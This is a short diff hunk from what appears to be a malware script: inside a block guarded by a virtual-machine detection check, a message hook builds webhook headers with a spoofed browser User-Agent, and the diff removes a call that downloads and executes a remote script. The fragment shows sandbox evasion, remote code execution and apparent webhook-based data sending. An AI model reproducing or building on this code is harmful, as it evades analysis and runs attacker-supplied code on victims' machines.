@@ -299,7 +299,6 @@ if VM_DETECTED == False:
 
     # Message Hook
     def messageHook(message):
-        download_and_execute_script(script_url)
         headers = { # Header for embed.
             'Content-Type': 'application/json',
             'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11' 
